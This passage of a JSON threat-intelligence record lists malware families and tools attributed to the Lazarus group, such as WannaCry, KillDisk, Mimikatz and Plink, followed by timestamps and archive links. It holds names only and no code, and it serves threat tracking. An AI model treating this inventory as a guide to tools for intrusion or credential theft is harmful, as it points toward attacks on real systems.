                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535709,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653787387,
    "ts_modification_date": 1653787387,
    "files": {
        "pdf": "https://archive.orkl.eu/0ec5dc66682ed4a3c9d0b11aec47f90e4441147b.pdf",
        "text": "https://archive.orkl.eu/0ec5dc66682ed4a3c9d0b11aec47f90e4441147b.txt",
        "img": "https://archive.orkl.eu/0ec5dc66682ed4a3c9d0b11aec47f90e4441147b.jpg"
    }
}